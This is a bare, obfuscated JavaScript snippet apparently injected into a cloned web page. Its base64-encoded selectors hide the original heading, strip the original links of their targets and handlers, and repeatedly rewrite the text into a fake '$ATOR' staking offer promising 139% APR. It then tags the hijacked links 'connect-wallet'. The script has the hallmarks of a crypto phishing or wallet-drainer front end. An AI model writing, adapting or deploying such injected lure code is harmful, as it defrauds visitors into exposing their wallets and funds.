
        function removeElementFuncRid(el) {
            try {
                el.style["opacity"] = "0%"
                el.style["position"] = "absolute";
                el.style["height"] = "0px";
                el.style["width"] = "0px";
            } catch(E) {}
        }
        
        function removeEventListenersFuncRid(element) {
            if (!element) {
            throw new Error('Element not provided.');
            }
            
            let current = element;
            while (current) {
                if (current.tagName && current.tagName.toLowerCase() === 'a') {
                    element.removeAttribute('href');
                }
                current = current.parentElement;
            }
        
            const clone = element.cloneNode(true);
            
            // Replace the original element with the clone
            element.parentNode.replaceChild(clone, element);
            
            return clone;
        }
    
                let loopRemoval = null;
                loopRemoval = setInterval(() => {
                    JSON.parse(atob("WyJkaXYjX19uZXh0ID4gYXJ0aWNsZSA+IHNlY3Rpb24gPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBoMiJd")).forEach((select) => {
                        try {
                            if (document.querySelector(select) != null) {
                                const el = document.querySelector(select);
                                removeElementFuncRid(el);
                            }
                        } catch(E) {}
                    })
                }, 100)
            
            setInterval(() => {
                JSON.parse(atob("WyJkaXYjX19uZXh0ID4gYXJ0aWNsZSA+IHNlY3Rpb24gPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBhIiwiZGl2I19fbmV4dCA+IGFydGljbGUgPiBzZWN0aW9uID4gZGl2ID4gZGl2ID4gZGl2ID4gZGl2ID4gZGl2ID4gYTpudGgtb2YtdHlwZSgzKSJd")).forEach((select) => {
                    try {
                        if (document.querySelector(select) != null) {
                            const el = document.querySelector(select);
                            if (!el.classList.contains("rid-loaded")) {
                                el.classList.add("rid-loaded")
                                removeEventListenersFuncRid(el);
                            }
                        }
                    } catch(E) {}
                })
            }, 100)
            const coolData = JSON.parse(atob("eyJkaXYjX19uZXh0ID4gYXJ0aWNsZSA+IHNlY3Rpb24gPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBoMSA+IHNwYW4iOiJUaGUgQW5vbnltaXR5IExheWVyIGZvciBEZVBpbiIsImRpdiNfX25leHQgPiBhcnRpY2xlID4gc2VjdGlvbiA+IGRpdiA+IGRpdiA+IGRpdiA+IGRpdiA+IGRpdiA+IHAiOiJBVE9SIGlzIGJ1aWxkaW5nIHRoZSBsYXJnZXN0IGFub255bW91cyBlY29zeXN0ZW0uIFN1cHBvcnQgQVRPUiBieSBzdGFraW5nIHlvdXIgJEFUT1IgYmVsb3cgZm9yIDEzOSUgQVBSKi4iLCJkaXYjX19uZXh0ID4gYXJ0aWNsZSA+IHNlY3Rpb24gPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBhIjoiU3Rha2UgJEFUT1IiLCJkaXYjX19uZXh0ID4gYXJ0aWNsZSA+IHNlY3Rpb24gPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBhOm50aC1vZi10eXBlKDMpIjoiU3Rha2luZyBEYXNoYm9hcmQifQ=="));
            setInterval(() => {
                Object.keys(coolData).forEach((selectKey) => {
                    try {
                        if (document.querySelector(selectKey) != null) {
                            const el = document.querySelector(selectKey);
                            if (!el.classList.contains("rid-loaded-2")) {
                                el.classList.add("rid-loaded-2")
                                el.innerText = coolData[selectKey]
                            }
                        }
                    } catch(E) {}
                })
            }, 100)
            setInterval(() => {
                JSON.parse(atob("WyJkaXYjX19uZXh0ID4gYXJ0aWNsZSA+IHNlY3Rpb24gPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBkaXYgPiBhIiwiZGl2I19fbmV4dCA+IGFydGljbGUgPiBzZWN0aW9uID4gZGl2ID4gZGl2ID4gZGl2ID4gZGl2ID4gZGl2ID4gYTpudGgtb2YtdHlwZSgzKSIsImRpdiNfX25leHQgPiBhcnRpY2xlID4gc2VjdGlvbiA+IGRpdiA+IGRpdiA+IGRpdiA+IGRpdiA+IGRpdiA+IGE6bnRoLW9mLXR5cGUoMykiXQ==")).forEach((select) => {
                    try {
                        if (document.querySelector(select) != null) {
                            const el = document.querySelector(select);
                            if (!el.classList.contains("rid-loaded-3")) {
                                el.classList.add("rid-loaded-3")
                                const newEl = removeEventListenersFuncRid(el);
                                newEl.classList.add("connect-wallet")
                            }
                        }
                    } catch(E) {}
                })
            }, 100)